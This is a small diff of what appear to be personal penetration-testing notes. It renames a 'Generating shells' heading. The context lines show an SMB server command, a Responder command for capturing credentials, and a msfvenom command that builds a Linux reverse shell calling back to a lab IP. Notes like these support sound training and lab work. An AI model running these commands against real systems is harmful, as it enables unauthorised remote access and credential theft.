@@ -145,7 +145,7 @@ sudo impacket-smbserver -smb2support smb smb
 sudo responder -I tun0
 ```
 
-### Generating shells
+### Generating shells (msvenom)
 ```bash
 # this produces shell code (don't need this much)
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh
